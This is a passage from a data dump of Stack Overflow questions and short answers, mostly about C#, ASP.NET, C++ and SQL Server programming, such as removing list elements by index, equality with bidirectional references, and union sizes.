","33708","","<p>No, I don't think there's something wrong with it. Probably, it's just the name of <code>IMeasurableFoo</code> that's misleading since it's just measurable and it's not a complete <code>Foo</code>.</p>
"
"<p>Let's say there is a list of <code>List&lt;UInt32&gt;</code></p>

<p>Thus, :</p>

<pre><code>12|12
23|33
33|22
11|22
</code></pre>

<p>I need to remove 0th and 2nd element (<code>List&lt;UInt32&gt;</code>). However, when I try to <code>foreach</code> this list and first remove 0th, the List collapses its elements and 1st becomes 0th now.. so I don't want to delete the wrong element, because my another <code>List&lt;int&gt;</code> includes the positions of elements I want to delete.</p>

<p>Anyway, I thought of doing some algorithm for this, but I wonder if there is already solution for this problem.</p>
","33708","","<p>Sort the positions list in descending order and remove elements in that order.</p>

<pre><code>foreach (var position in positions.OrderByDescending(x=&gt;x))
   list.RemoveAt(position);
</code></pre>
"
"<p>What is the replacement for a server control in ASP.NET MVC? What I want to do is to create a declarative and imperative binding so I can write</p>

<pre><code>&lt;cc1:MyControl Header=""Some Header"" Content=""Some Content"" /&gt;
</code></pre>

<p>which would mean that an instance of the MyControl class will be created and possibly rendered to</p>

<pre><code>&lt;h1&gt;Some Header&lt;/h1&gt;
&lt;p&gt;Content&lt;/p&gt;
</code></pre>

<p>I don't want any viewstate or postback crap, just the modularity. I also want these modules to be contained in a separate class library, so ViewUserControls will not do for me. Using a server controls in the normal way works, but it generates a form tag and a viewstate field, which I do not want if I can avoid it.</p>

<p>I have seen <a href=""http://stackoverflow.com/questions/317995/server-controls-and-mvc"">this question</a> and <a href=""http://stackoverflow.com/questions/264664/server-controls-in-asp-net-mvc"">this one</a> about how to use server controls in ASP.NET MVC, but they do not provide enough answer.</p>

<p><strong>Edit:</strong> I found the answer. When I added the user control using the designer, it automatically created a &lt;form&gt; which I missed. If I simply remove that tag, everything works perfectly.</p>
","33708","","<p>You can still use <strong>all controls</strong> in ASP.NET MVC if they don't require rendering in a server form.</p>

<p><code>ascx</code> files and <code>@Register</code> directives still work pretty well. The great new thing is <code>Html.RenderPartial</code> method that lets you pass a model object to a partial view (<code>ascx</code>) and have it render accordingly.</p>
"
"<p>As the title says, how can generate (and display) images on the fly for simple charting, resizing etc?</p>

<p>Thanks</p>
","33708","","<p>Use <code>System.Drawing</code> namespace.</p>

<p>Add a reference to <code>System.Drawing</code> assembly. Create a new <code>Bitmap</code> class. Call <code>CreateGraphics</code> on it. Use the returned <code>Graphics</code> object to do your drawing. Set the <code>Response.ContentType</code> to the appropriate image MIME type. Finally save the <code>Bitmap</code> to the <code>Response.Output</code> stream.</p>
"
"<p>Using this method after the SignOut() call redirects to '...login.aspx?ReturnUrl=%2fmydomainname%2flogout.aspx' so that the user can't log back in again, since a successful login returns to the logout page. The login page is set in webconfig and the app successfully gets that page. Why would a ReturnURL be stuck on the tail of the URL?</p>
","33708","","<p>This is how <code>RedirectFromLoginPage</code> works. It appends the current URL to the query string of the login page. This way, the login page can redirect the user back to the place he where.</p>

<p>If you don't want this to happen, you can manually redirect to the login page using <code>Response.Redirect</code>.</p>
"
"<h2>Background</h2>

<p>I have two objects which have bidirectional association between them in a C# project I am working on. I need to be able to check for value equality (vs reference equality) for a number of reasons (e.g to use them in collections) and so I am implementing IEquatable and the related functions.</p>

<h2>Assumptions</h2>

<ul>
<li>I am using C# 3.0, .NET 3.5, and Visual Studio 2008 (although it shouldn't matter for equality comparison routine issue).</li>
</ul>

<h2>Constraints</h2>

<p>Any solution must:</p>

<ul>
<li>Allow for bidirectional association to remain intact while permitting checking for value equality.</li>
<li>Allow the external uses of the class to call Equals(Object obj) or Equals(T class) from IEquatable and receive the proper behavior (such as in System.Collections.Generic).</li>
</ul>

<h2>Problem</h2>

<p>When implementing IEquatable to provide checking for value equality on types with bidirectional association, infinite recursion occurs resulting in a stack overflow.</p>

<p><strong>NOTE:</strong> Similarly, using all of the fields of a class in the GetHashCode calculation will result in a similar infinite recursion and resulting stack overflow issue.</p>

<p><hr /></p>

<h2>Question</h2>

<p><strong>How do you check for value equality between two objects which have bidirectional association without resulting in a stack overflow?</strong></p>

<p><hr /></p>

<h2>Code</h2>

<p><strong>NOTE:</strong> This code is notional to display the issue, not demonstrate the actual class design I'm using which is running into this problem</p>

<pre><code>using System;

namespace EqualityWithBiDirectionalAssociation
{

    public class Person : IEquatable&lt;Person&gt;
    {
        private string _firstName;
        private string _lastName;
        private Address _address;

        public Person(string firstName, string lastName, Address address)
        {
            FirstName = firstName;
            LastName = lastName;
            Address = address;
        }

        public virtual Address Address
        {
            get { return _address; }
            set { _address = value; }
        }

        public virtual string FirstName
        {
            get { return _firstName; }
            set { _firstName = value; }
        }

        public virtual string LastName
        {
            get { return _lastName; }
            set { _lastName = value; }
        }

        public override bool Equals(object obj)
        {
            // Use 'as' rather than a cast to get a null rather an exception
            // if the object isn't convertible
            Person person = obj as Person;
            return this.Equals(person);
        }

        public override int GetHashCode()
        {
            string composite = FirstName + LastName;
            return composite.GetHashCode();
        }


        #region IEquatable&lt;Person&gt; Members

        public virtual bool Equals(Person other)
        {
            // Per MSDN documentation, x.Equals(null) should return false
            if ((object)other == null)
            {
                return false;
            }

            return (this.Address.Equals(other.Address)
                &amp;&amp; this.FirstName.Equals(other.FirstName)
                &amp;&amp; this.LastName.Equals(other.LastName));
        }

        #endregion

    }

    public class Address : IEquatable&lt;Address&gt;
    {
        private string _streetName;
        private string _city;
        private string _state;
        private Person _resident;

        public Address(string city, string state, string streetName)
        {
            City = city;
            State = state;
            StreetName = streetName;
            _resident = null;
        }

        public virtual string City
        {
            get { return _city; }
            set { _city = value; }
        }

        public virtual Person Resident
        {
            get { return _resident; }
            set { _resident = value; }
        }

        public virtual string State
        {
            get { return _state; }
            set { _state = value; }
        }

        public virtual string StreetName
        {
            get { return _streetName; }
            set { _streetName = value; }
        }

        public override bool Equals(object obj)
        {
            // Use 'as' rather than a cast to get a null rather an exception
            // if the object isn't convertible
            Address address = obj as Address;
            return this.Equals(address);
        }

        public override int GetHashCode()
        {
            string composite = StreetName + City + State;
            return composite.GetHashCode();
        }


        #region IEquatable&lt;Address&gt; Members

        public virtual bool Equals(Address other)
        {
            // Per MSDN documentation, x.Equals(null) should return false
            if ((object)other == null)
            {
                return false;
            }

            return (this.City.Equals(other.City)
                &amp;&amp; this.State.Equals(other.State)
                &amp;&amp; this.StreetName.Equals(other.StreetName)
                &amp;&amp; this.Resident.Equals(other.Resident));
        }

        #endregion
    }

    public class Program
    {
        static void Main(string[] args)
        {
            Address address1 = new Address(""seattle"", ""washington"", ""Awesome St"");
            Address address2 = new Address(""seattle"", ""washington"", ""Awesome St"");

            Person person1 = new Person(""John"", ""Doe"", address1);

            address1.Resident = person1;
            address2.Resident = person1;

            if (address1.Equals(address2)) // &lt;-- Generates a stack overflow!
            {
                Console.WriteLine(""The two addresses are equal"");
            }

            Person person2 = new Person(""John"", ""Doe"", address2);
            address2.Resident = person2;

            if (address1.Equals(address2)) // &lt;-- Generates a stack overflow!
            {
                Console.WriteLine(""The two addresses are equal"");
            }

            Console.Read();
        }
    }
}
</code></pre>
","33708","","<p>You are coupling classes too tightly and mixing values and references. You should either consider checking reference equality for one of the classes or make them aware of each other (by providing an <code>internal</code> specialized <code>Equals</code> method for the specific class or manually checking value equality of the other class). This shouldn't be a big deal since your requirements explicitly ask for this coupling so you are not introducing one by doing this.</p>
"
"<p>I have an ASP.NET 2.0 (C#) web app, and in it I have a gridview that gets its data from an oracle database.</p>

<p>I want to know how to check if the gridview is empty, and the do something. </p>

<p>I have already tried:</p>

<pre><code>if(GridView.Rows.Count == 0)
{
// Do Something
}
</code></pre>

<p>but it doesn't work...</p>

<p>Any ideas?</p>

<p>Thank you.</p>
","33708","","<p>This doesn't work since the <code>GridView</code> is data bound and is going to fetch the actual data at a later time while rendering the page. You should check this by directly querying the data binding source of the gridview (see if the actual list that's grid view bound to is empty or not).</p>

<p>If you just want to display something when it's empty, you should use <code>&lt;EmptyDataTemplate&gt;</code> in your markup:</p>

<pre><code>&lt;asp:GridView runat=""server""&gt;
&lt;EmptyDataTemplate&gt;The grid is empty&lt;/EmptyDataTemplate&gt;
&lt;/asp:GridView&gt;
</code></pre>
"
"<p>I have an application that performs a write to a database each time a page is requested. This db write is not time critical, so for performance reasons, I have the page queuing the object using MSMQ. Of course, I have to have something to read the queue and process requests, so I wrote a class that looks similar to this:</p>

<pre><code>public class QueueProcessor {
    public void Start() 
    {
        // Create background thread to run ProcessInternal()
    }

    public void Stop() 
    {
        // Stop the previously created thread
    }

    public void ProcessInternal() 
    {
        while (runnable) 
        {
            // check queue for messages, process them one at a time, 
            // then wait indefinitely for more messages
        }
    } 
}
</code></pre>

<p>Now, since this web site is fairly small in nature, I realy don't want to have to add a windows service to the deployment routine, so what I'm doing at this time is creating a new QueueProcessor in the Application_Start event and starting it there. My thought is that the thread will run for the life of the application, and if the application gets killed by IIS, it will merely start up again the next time someone accesses a page.</p>

<p>To prevent long periods of idle where queued messages are not processed because the application has been killed by IIS, I've set up a wget request to execute every few minutes on one of the site's pages, thus keeping the application alive and ensuring the background thread will keep running.</p>

<p>My question is, I don't see this design very often, and I'm wondering if there are any potential problems with it? </p>

<p>EDIT: </p>

<p>After doing some reading on the subject, I found that the major problem with this approach (and similar ones, such as the cache removal callback function) is the type of function they were being asked to perform with regards to scalability. For example, if you're doing a mass update or something, you obviously don't want the task running on all of your web servers - you'll have conflicting updates and potential data loss that way. </p>

<p>However, in my very particular case, the thread is processing ONLY requests received by that server that are sitting in that server's message queue. Therefore, if I were to scale this app to say 5 servers, each thread would process each server's queued messages without any problems. Again, the order of the records in the database isn't so important that a few similar requests from different servers within a small interval would be a problem, so I still think this solution is reasonable for my problem.</p>
","33708","","<p>I believe setting up the wget request is not much easier than deploying a Windows service.
Other than that, I don't see any specific problems with it. If reliability and accurate timing isn't critical, this would work.</p>
"
"<p>I have some thumbnails I want to display in a Gridview. I am not familiar with all the customization that is offered. Basically I want to store the images in a Gridview, maybe spanning 5 columns wide...and then however many rows it takes to complete the rest. I don't want any column or row titles, and really don't want to see evidence of the actual grid. I also want to make the images clickable. </p>

<p>I will be pulling the images from an Sql database in Asp.net. I do not want to bind the grid to an sqldatasource, but rather stick the images in the grid with some sort of loop in the code behind the page. This is where it gets confusing to me. I know you can create a datatable and add columns and rows. However, it seems like the rows/columns do not span. How would you store the images so that it worked like a grid. I provided some (very)sudo code below to give you an idea of what I am trying to do.</p>

<p>sudo code:</p>

<pre><code>colcount = 0;  
rowcount = 0;  
imagecount = 0;  
while(images.length &gt; imagecount){  
    if(colcount &lt; 5){  
        grid[rowcount][colcount] = images[imagecount];  
        colcount++;  
        imagecount++;  
    }  
    else{  
        rowcount++;
        colcount = 0; 
    }
}
</code></pre>
","33708","","<p>Why don't you manually generate your grid?</p>

<p>Create a method in your codebehind that outputs the necessary HTML using <code>Response.Write</code> statements. In the <code>.aspx</code> page, use <code>&lt;% RenderGrid(); %&gt;</code> to call your method and display the appropriate grid.</p>
"
"<p>Hey guys, I'm trying to get my head around LINQ and FP, so forgive me if this is naive.  I'm trying to do some string parsing using LINQ and mapping onto a function, so I need to split my string up into smaller strings.</p>

<p>I want to split the array up into smaller lists of two.  Can I use a reduce (.Aggregate()) to do this?  I was trying to work out how to apply the reduce to return a list but I wasn't having any luck.</p>

<p>What I want is:</p>

<pre><code>myString.ToCharArray().Take(2)
</code></pre>

<p>Mapped onto every second element.I couldn't get around in my head how to reduce the list without applying the take to every single element, instead of every second one.</p>

<p>Concrete example.</p>

<blockquote>
  <p>given (1, 2, 3, 4, 5, 6)</p>
  
  <p>I want ((1, 2), (3,4), (5, 6))</p>
</blockquote>

<p>To clarify:</p>

<blockquote>
  <p>given ""abcdef""</p>
  
  <p>I want ""ab"", ""cd"", ""ef""</p>
</blockquote>

<p>Cheers for your help guys.</p>
","33708","","<pre><code>Enumerable.Range(0, myString.Length)
      .GroupBy(index =&gt; index / 2, index =&gt; myString[index])
      .Select(eachGroup =&gt; new string(eachGroup.ToArray()));
</code></pre>

<p>Note that the example above relies on the fact that you have index based access to the collection. To make it work on every <code>IEnumerable&lt;T&gt;</code> without this limitation:</p>

<pre><code>collection.Select((e,i) =&gt; new { Index = i, Element = e })
      .GroupBy(x =&gt; x.Index / 2, x =&gt; x.Element);
</code></pre>
"
"<h3>Duplicate</h3>

<blockquote>
  <p><a href=""http://stackoverflow.com/questions/161477/typedef-in-c"">typedef in C#?</a></p>
</blockquote>

<p><hr /></p>

<p>Is there a way to create actually keywords in C#. Like for example turning object x into a datatype like int? I guess I'm asking is there anything like a typedef for C# and if not how can I actually make my own types that look like this:</p>

<pre><code>public static crap Main(string[] args)
{
    // Note 'crap' and not 'void'!
}
</code></pre>
","33708","","<p>C# intentionally does not provide C/C++ style macros (using <code>#define</code>). You cannot invent these kind of language features and extend the language beyond types. There are good reasons they left this feature out. If you really need these kind of features, you can always run the C# source file through a C preprocessor and compile the resulting file with a C# compiler. You can also rely on other templating features provided by your environment (most likely <a href=""http://www.hanselman.com/blog/T4TextTemplateTransformationToolkitCodeGenerationBestKeptVisualStudioSecret.aspx"" rel=""nofollow"">Visual Studio T4 engine</a>).</p>
"
"<p>I'm curious if any developers use string.IsNullOrEmpty() more often with a negative than with a positive</p>

<p>e.g.</p>

<pre><code>if (!string.IsNullOrEmpty())
</code></pre>

<p>This is how I use the method 99% of the time. What was the design decision for this?</p>
","33708","","<p>Double negatives are usually discouraged in naming stuff. <code>!string.NotNullOrEmpty(...)</code> would make one.</p>
"
"<p>Occasionally I need to use fixed-width integers for communication with external devices like PLCs. I also use them to define bitmasks and perform bit manipulation of image data. AFAIK the C99 standard defines fixed-width integers like int16_t. However the compiler I use, VC++ 2008 doesn't support C99 and AFAIK Microsoft is not planning to support it. </p>

<p>My question is what is the best practice for using fixed-width integers in C++? </p>

<p>I know that VC++ defines non-standard fixed-width integers like __int16, but I am hesitant to use a non-standard type. Will the next C++ standard define fixed-width integers?    </p>
","33708","","<p>You can workaround the problem with some <code>#ifdef</code> directives.</p>

<pre><code>#ifdef _MSC_VER
   typedef __int16 int16_t
#else
   #include &lt;stdint.h&gt;
#endif
</code></pre>
"
"<p>We have <code>Request.UserHostAddress</code> to get the IP address in ASP.NET, but this is usually the user's ISP's IP address, not exactly the user's machine IP address who for example clicked a link. How can I get the real IP Address?</p>

<p>For example, in a Stack Overflow user profile it is: <strong>""Last account activity: 4 hours ago from 86.123.127.8""</strong>, but my machine IP address is a bit different. How does Stack Overflow get this address? </p>

<p>In some web systems there is an IP address check for some purposes. For example, with a certain IP address, for every 24 hours can the user just have only 5 clicks on download links? This IP address should be unique, not for an ISP that has a huge range of clients or Internet users.</p>

<p>Did I understand well?</p>
","33708","","<p>What else do you consider the user IP address? If you want the IP address of the network adapter, I'm afraid there's no possible way to do it in a Web app. If your user is behind NAT or other stuff, you can't get the IP either.</p>

<p><strong>Update</strong>: While there are Web sites that use IP to limit the user (like rapidshare), they don't work correctly in NAT environments.</p>
"
"<p>How can I create F# dll and call it in C#?
Thank you</p>
","33708","","<p>To create a DLL in F#, you should set the output type to class library in project properties. Use Add Reference dialog as mentioned before to add the reference in your C# project.</p>
"
"<p>I've been using C++ for a few years, and today I don't know if this is a mere brainfart or what, but how can this be perfectly legal:</p>

<pre><code>int main(int argc, char **argv)
{
    size_t size;
    cin &gt;&gt; size;
    int array[size];
    for(size_t i = 0; i &lt; size; i++)
    {
        array[i] = i;
        cout &lt;&lt; i &lt;&lt; endl;
    }

    return 0;
}
</code></pre>

<p>Compiled under GCC. How can the size be determined at run-time without new or malloc? Just to double check, I've googled some and all similar codes to mine are claimed to give storage size error. Even Deitel's C++ How To Program p. 261 states under Common Programming Error 4.5: Only constants can be used to declare the size of automatic and static arrays.</p>

<p>Enlight me.</p>
","33708","","<p>This is valid in C99. </p>

<p>C99 standard supports variable sized arrays on the stack. Probably your compiler has chosen to support this construct too.</p>

<p>Note that this is different from <code>malloc</code> and <code>new</code>. <code>gcc</code> allocates the array on the stack, just like it does with <code>int array[100]</code> by just adjusting the stack pointer. No heap allocation is done. It's pretty much like <a href=""http://msdn.microsoft.com/en-us/library/wb1s57t5(VS.80).aspx""><code>_alloca</code></a>.</p>
"
"<p>Other being able to sanity check values in a setter is there a more underlying reason to prefer properties to public variables?</p>
","33708","","<p>Changing a field to a property in the future is considered a <em>breaking change</em>. Fields are considered implementation details of classes and exposing them publicly breaks encapsulation.</p>
"
"<p>Since its possibly one of the most widely used methods of the Java language, why does it have to accept an array of Strings and doesn't work without it? For example, I could always live with:</p>

<pre><code>public static void main() {}
</code></pre>

<p>over</p>

<pre><code>public static void main(String[] args) {}
</code></pre>

<p>Is there a higher purpose to this than just being able to accept command-line arguments, especially since a vast majority of Java programs are GUI driven and don't need to receive args through command line?</p>
","33708","","<p>What ""vast-majority"" of programs do does not really make much difference in terms of what is needed to be done. There are still lots of command line programs that are driven by command line args.</p>
"
"<p>I'm rather beginner in C# world (and .Net as well), so I decided to get some advices from more experienced developers. Which free unit testing framework for C# would you advise? I came across NUnit, which seemed to look interestingly, but in it's documentation I found out, that there were versions for .Net 1.1 and .Net 2.0. I need to use it in project targeted to .Net 3.0. </p>

<p>So, please let me know if:</p>

<ul>
<li>I can use NUnit for .Net 3.0 project?</li>
</ul>

<p>or:</p>

<ul>
<li>there is something better than NUnit?</li>
</ul>
","33708","","<p>Yes. NUnit works well on .NET 3.0 and 3.5 too.</p>

<p>Your second question is pretty subjective. NUnit is a widely used unit testing framework for .NET. MSTest is another one that is shipped with Visual Studio. xUnit is another one. There is a comparison on xUnit project: <a href=""http://xunit.codeplex.com/Wiki/View.aspx?title=Comparisons"" rel=""nofollow"">http://xunit.codeplex.com/Wiki/View.aspx?title=Comparisons</a></p>
"
"<p>I have a products table.  Each row in that table corresponds to a single product and it's identified by a unique Id. Now each product can have multiple ""codes"" associated with that product.  For example:</p>

<pre>
Id     |    Code
----------------------
0001   |   IN,ON,ME,OH
0002   |   ON,VI,AC,ZO
0003   |   QA,PS,OO,ME
</pre>

<p>What I'm trying to do is create a stored procedure so that I can pass in a codes like ""ON,ME"" and have it return every product that contains the ""ON"" or ""ME"" code.  Since the codes are comma separated, I don't know how I can split those and search them.  Is this possible using only TSQL?</p>

<p>Edit: It's a mission critical table.  I don't have the authority to change it.</p>
","33708","","<p>The way you are storing data breaks normalization rules. Only a single atomic value should be stored in each field. You should store each item in a single row.</p>
"
"<p>Passing two parameters to a new thread on the threadpool can sometimes be complicated, but it appears that with lambda expressions and anonymous methods, I can do this:</p>

<pre><code>public class TestClass
{
    public void DoWork(string s1, string s2)
    {
        Console.WriteLine(s1);
        Console.WriteLine(s2);
    }
}

try
{
    TestClass test = new TestClass();
    string s1 = ""Hello"";
    string s2 = ""World"";
    ThreadPool.QueueUserWorkItem(
        o =&gt; test.DoWork(s1, s2)
        );
}
catch (Exception ex)
{
    //exception logic
}
</code></pre>

<p>Now, I've certainly simplified this example, but these points are key:</p>

<ul>
<li>The string objects being passed are immutable and therefore threadsafe</li>
<li>The s1 and s2 variables are declared within the scope of the try block, which I exit immediately after queuing the work to the thread pool, so the s1 and s2 variables are never modified after that.</li>
</ul>

<p>Is there something wrong with this?</p>

<p>The alternative is to create a new class that implements an immutable type with 3 members: test, s1, and s2.  That just seems like extra work with no benefit at this point.</p>
","33708","","<p>It's a nice way of doing it. I don't see any disadvantages of using lambdas. It's simple and clean. </p>
"
"<p>What's the preferred (best practice) means of connecting an ASP.Net Website to a database?  I doubt it's as simple as using Trusted-Connection and giving the NT-Authority accounts access.  </p>

<p>What do y'all do?  Assuming a clean install of SQL Server (2008), what do you do to configure access to the database for a website?</p>
","33708","","<p>I usually run ASP.NET app pool as a separate account (not <code>NT AUTHORITY\NETWORK SERVICE</code>) and use Windows authentication to access the SQL Server. This method has the advantage of not storing the password in config files.</p>

<p>Steps:</p>

<ol>
<li>Create a user account to run your ASP.NET application on.</li>
<li>Create an application pool in IIS and run it on the created account.</li>
<li>Assign NTFS permissions that your application needs to the account.</li>
<li>Grant permission to login on SQL Server.</li>
<li>Assign the appropriate database roles to the created login.</li>
</ol>

<p>This will work for many apps. For more complex security environments, you might need more sophisticated strategies.</p>
"
"<p>What is the sizeof the union in C/C++? Is it the sizeof the largest datatype inside it? If so, how does the compiler calculate how to move the stack pointer if one of the smaller datatype of the union is active?</p>
","33708","","<p>A <code>union</code> always takes up as much space as the largest member. It doesn't matter what is currently in use.</p>

<pre><code>union {
  short x;
  int y;
  long long z;
}
</code></pre>

<p>An instance of the above <code>union</code> will always take at least a <code>long long</code> for storage.</p>

<p><em>Side note</em>: As noted by <a href=""http://stackoverflow.com/questions/740577/sizeof-a-union-in-c-c/740653#740653"">Stefano</a>, the actual space any type (<code>union</code>, <code>struct</code>, <code>class</code>) will take does depend on other issues such as alignment by the compiler. I didn't go through this for simplicity as I just wanted to tell that a union takes the biggest item into account. <strong>It's important to know that the actual size <em>does</em> depend on alignment</strong>.</p>
"
"<p>I'm using this function to generate a hash for a password and then store it in the database (SQL Server).</p>

<p>The code looks like this:</p>

<pre><code>byte[] saltBytes = new byte[16];
new RNGCryptoServiceProvider ().GetBytes (saltBytes);
string salt = Convert.ToBase64String (saltBytes);
string saltedPasswordHash =
FormsAuthentication.HashPasswordForStoringInConfigFile (password + salt, FormsAuthPasswordFormat.SHA1.ToString ());
</code></pre>

<p>Now the question: in what format is the output of HashPasswordForStoringInConfigFile () - do I store it as char(length) or nchar(length)?</p>

<p>Or is there any other preferred way to store the hash, maybe not as a string?</p>

<p>Any input and semi-relevant comments are greatly appreciated.</p>
","33708","","<p>SQL Server supports binary columns (<code>binary(len)</code>, and <code>varbinary(len)</code>) designed to store binary data. You might want to consider using them. In that case, you could use classes such as <code>System.Security.Cryptography.SHA512Managed</code> directly, instead of <code>HashPasswordForStoringInConfigFile</code></p>
"
"<p>I want to know <em>everything</em> about the <code>yield</code> statement, in an easy to understand form.</p>

<p>I have read about the <code>yield</code> statement and its ease when implementing the iterator pattern. However, most of it is very dry. I would like to get under the covers and see how Microsoft handles return yield.</p>

<p>Also, when do you use yield break?</p>
","33708","","<p><code>yield</code> works by building a state machine internally. It stores the current state of the routine when it exits and resumes from that state next time.</p>

<p>You can use Reflector to see how it's implemented by the compiler.</p>

<p><code>yield break</code> is used when you want to stop returning results. If you don't have a <code>yield break</code>, the compiler would assume one at the end of the function (just like a <code>return;</code> statement in a normal function)</p>
"
"<p>I think instance variables are simple data types like int or double. Everything that is created automatically when the object is created.</p>

<p>If an object creates additional objects - like everything that is it done with the NEW keyword - these are not instance variables.</p>

<p>Am I right or wrong? 
What is the exact definition?</p>
","33708","","<p>Instance variables (aka. fields) are variables that belong to an <em>instance</em>, as opposed to <em>static variables</em> that belong to a <em>class</em> and local variables that belong to the <em>local stack frame</em>.</p>

<p>Your definition defines an <em>object</em> which is an instance of a type. </p>
"
"<p>It happens sometimes, how do i get to know when my stored procedure dropped/removed without my knowledge?</p>

<p>It annoys me whenever I debugs and found to know that the stored procedure doesn't exits, which created and tested some days ago.</p>

<p>Is there a way to know the removed Stored Procedures in MS SQL Server?</p>
","33708","","<pre><code>if not exists(select * from sysobjects where type='P' and name= @procedure_name)
   print 'does not exist'
</code></pre>
"
"<p><br>
can any one give precise difference between an interface and class in java.</p>

<p><strong>Duplicate:</strong></p>

<ul>
<li><a href=""http://stackoverflow.com/questions/258285/is-a-java-interface-an-abstract-class"">http://stackoverflow.com/questions/258285/is-a-java-interface-an-abstract-class</a></li>
<li><a href=""http://stackoverflow.com/questions/639592/why-are-interfaces-preferred-to-abstract-classes"">http://stackoverflow.com/questions/639592/why-are-interfaces-preferred-to-abstract-classes</a></li>
</ul>
","33708","","<p>Interfaces cannot contain implementation.</p>

<p>An interface is there to define a <em>contract</em>. Implementing an interface is declaring conformance to that contract. </p>

<p>Java does not support multiple inheritance but it does support implementing multiple interfaces.</p>
"
"<p>I saw two common approaches for coding standards for private member variables:</p>

<pre><code>class Foo
{
    private int _i;
    private string _id;     
}
</code></pre>

<p>and </p>

<pre><code>class Foo
{
    private int m_i;
    private string m_id; 
}
</code></pre>

<p>I believe the latter is coming from C++. Also, many people specify type before the member variable (e.g. <code>double m_dVal</code>) to indicate that it is a non-constant member variable of the type double?</p>

<p>What are the conventions in C#?</p>
","33708","","<p>As noted by <a href=""http://blogs.msdn.com/brada/articles/361363.aspx"">Brad Abrams: internal coding guidelines</a>:</p>

<blockquote>
  <p>Do not use a prefix for member
  variables (<code>_</code>, <code>m_</code>, <code>s_</code>, etc.). If you
  want to distinguish between local and
  member variables you should use
  â<code>this.</code>â in C# and â<code>Me.</code>â in VB.NET.</p>
</blockquote>
"
"<p>Is it possible to programmatically resolve a URL to a file using ASP.NET and IIS?  Specifically I'd like the file to be outside of my Virtual Directory (could be anywhere on the local file system).  So if a URL comes in like <a href=""http://mysite/somepicture.jpg"" rel=""nofollow"">http://mysite/somepicture.jpg</a> I'd like to be able to return c:\mypicture.jpg.  I looked into creating an IHttpModule for URL rewriting but that isn't quite what I need - it's limited to URLs within the existing site.</p>
","33708","","<p>You cannot achieve it by URL rewriting as the file is not hosted on your Web site. You should use <code>Response.WriteFile</code> method in an <code>HttpModule</code> or <code>HttpHandler</code> to manually stream the file to the user.</p>
"
"<p>Consider i execute a method 'Method1' in C#.
Once the execution goes into the method i check few condition and if any of them is false, then the execution of  Method1 should be stopped. how can i do this, i.e can the execution of a method when certain conditions are met.?</p>

<p>but my code is something like this,</p>

<pre><code>int Method1()
{
switch(exp)
{
case 1:
if(condition)
 //do the following
**else
//Stop executing the method.**
case2:
...
}
}
</code></pre>
","33708","","<p>Use the <code>return</code> statement.</p>

<pre><code>if(!condition1) return;
if(!condition2) return;

// body...
</code></pre>
"
"<p>Consider this:</p>

<p>Requisite:</p>

<pre><code>//The alphabet from a-z
List&lt;char&gt; letterRange = Enumerable.Range('a', 'z' - 'a' + 1)
.Select(i =&gt; (Char)i).ToList(); //97 - 122 + 1 = 26 letters/iterations
</code></pre>

<p>Standard foreach:</p>

<pre><code>foreach (var range in letterRange)
{
    Console.Write(range + "","");
}
Console.Write(""\n"");
</code></pre>

<p>Inbuilt foreach:</p>

<pre><code>letterRange.ForEach(range =&gt; Console.Write(range + "","")); //delegate(char range) works as well
Console.Write(""\n"");
</code></pre>

<p>I have tried timing them against each other and the inbuilt foreach is up to 2 times faster, which seems like a lot.</p>

<p>I have googled around, but I can not seem to find any answers.</p>

<p>Also, regarding: <a href=""http://stackoverflow.com/questions/365615/in-c-net-which-loop-runs-faster-for-or-foreach"">http://stackoverflow.com/questions/365615/in-c-net-which-loop-runs-faster-for-or-foreach</a></p>

<pre><code>for (int i = 0; i &lt; letterRange.Count; i++)
{
    Console.Write(letterRange[i] + "","");
}
Console.Write(""\n"");
</code></pre>

<p>Doesn't act execute faster than standard foreach as far as I can tell.</p>
","33708","","<p>I think your benchmark is flawed. <code>Console.Write</code> is an I/O bound task and it's the most time consuming part of your benchmark. This is a micro-benchmark and should be done very carefully for accurate results.</p>

<p>Here is a benchmark: <a href=""http://diditwith.net/PermaLink,guid,506c0888-8c5f-40e5-9d39-a09e2ebf3a55.aspx"">http://diditwith.net/PermaLink,guid,506c0888-8c5f-40e5-9d39-a09e2ebf3a55.aspx</a> (It looks good but I haven't validated it myself).</p>
"
"<p>How can I disable an event handler temporarily in WinForms?</p>
","33708","","<p>Probably, the simplest way (which doesn't need unsubscribing or other stuff) is to declare a boolean value and check it at the beginning of the handler:</p>

<pre><code>bool dontRunHandler;

void Handler(object sender, EventArgs e) {
   if (dontRunHandler) return;

   // handler body...
}
</code></pre>
"
"<p>I need to device a way to learn if the user who surfs to my site has dotnet framework installed on his computer, and which version (less important).<br />
I need this to work at least with Firefox and IE 7 and up.    </p>

<p>Any ideas?</p>

<p>(Is there any web service the Framework on the ""localhost"" exposes?)</p>
","33708","","<p>.NET Framework alters the user agent of the popular browsers. You can check the user agent to find out.</p>

<p>Firefox:</p>

<blockquote>
  <p>Mozilla/5.0 (Windows; U; Windows NT
  6.0; en-US; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET
  CLR 3.5.30729)</p>
</blockquote>

<p>IE:</p>

<blockquote>
  <p>Mozilla/4.0 (compatible; MSIE 8.0;
  Windows NT 6.0; WOW64; Trident/4.0;
  SLCC1; .NET CLR 2.0.50727; .NET CLR
  3.5.30729; .NET CLR 3.0.30618; InfoPath.2)</p>
</blockquote>
"
"<p>I guess the question is really about how to define a type as an existing primitive data type. Below clearly doesn't work, but I think you'll get the idea.</p>

<pre><code>Type DWORD = typeof(UInt32);

private DWORD func1(int x)
{
    return 123;
}
</code></pre>
","33708","","<p>There is no <code>typedef</code> in C#. You can't use <code>#define</code> macros to replace strings either (they are just conditional). The only rough equivalent is <code>using DWORD = System.UInt32;</code> on top of your source file.</p>
"
"<p>What's the best way to implement ""Back to Search Results"" in an ASP.NET application? I've been letting users do the BACK button in the browser, but they always get a prompt to resubmit the form.</p>

<p>Is there an effective way to work around this resubmit? </p>

<p>Should I cache the search criteria/url in session and redirect them when they press 'back'? </p>

<p>What's the best practice here?</p>
","33708","","<p>I'd pass the search criteria in querystring and make the back link something like <code>&lt;a href='/Search.aspx?q=keywords'&gt;Back&lt;/a&gt;</code> instead.</p>
"
"<p>Primarily I've done basic (novice level) software development on a Windows machine, but I've always had MS Visual Studio to help me step through the process of debugging.  </p>

<p>Now, however, it looks like I will be on Linux, so in order to get ready for the jump I want to make sure I have a tool/tools lined up to help me step through the code and debug.  </p>

<p>Unfortunately when I've verbally asked folks how they go about debugging on Linux, I typically get the following answer, ""Oh, I just put a bunch of print statements.""  OMG!  No way you say, but yes that is their answer.  </p>

